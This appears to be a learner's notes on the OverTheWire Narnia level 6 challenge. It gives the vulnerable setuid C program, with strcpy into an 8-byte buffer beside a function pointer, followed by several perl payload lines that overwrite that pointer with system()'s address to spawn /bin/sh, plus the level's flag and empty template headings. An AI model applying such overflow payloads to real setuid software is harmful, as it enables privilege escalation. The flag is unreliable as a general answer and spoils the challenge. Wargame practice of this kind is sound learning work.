```c
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```


System's address = 0xf7dd18e0

0xf7dd18e0 & 0xff000000 != 0xff000000 so it pass the guard.

Next task to change fp into those address, and since we know that fp was pointing to puts, 
puts address = 0xf7df8a90

find that address on stack and replace it with systems address.

perl -e 'print "/bin/sh ". "AAAAAAAAAAAAAAAA\xe0\x18\xdd\xf7" '

./narnia6 "/bin/sh" "$(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7"')"

run "/bin/sh" $(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7"')


r $(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7" . " " . "B"x8  . "/bin/sh" ')

r $(perl -e 'print "A"x8 . "\xe0\x18\xdd\xf7" . " " . "B"x8  . "/bin/sh" ')


## Challenge Info

**Platform:** OverTheWire - Narnia
**Tags :** #Challenge #BufferOverflow #C #BinaryExploitation
**Completion Date & Time :** 2026 - 05 - 23 / 16:39

---
## FLAG : `54RtepCEU0`

---
## Solution :

### Step 1 :

### Step 2 :

---
### Key Takeaways : 



---
## Related Concepts : 
[[]]

---
## Next Challenge :
[[Narnia (7 -> 8)]]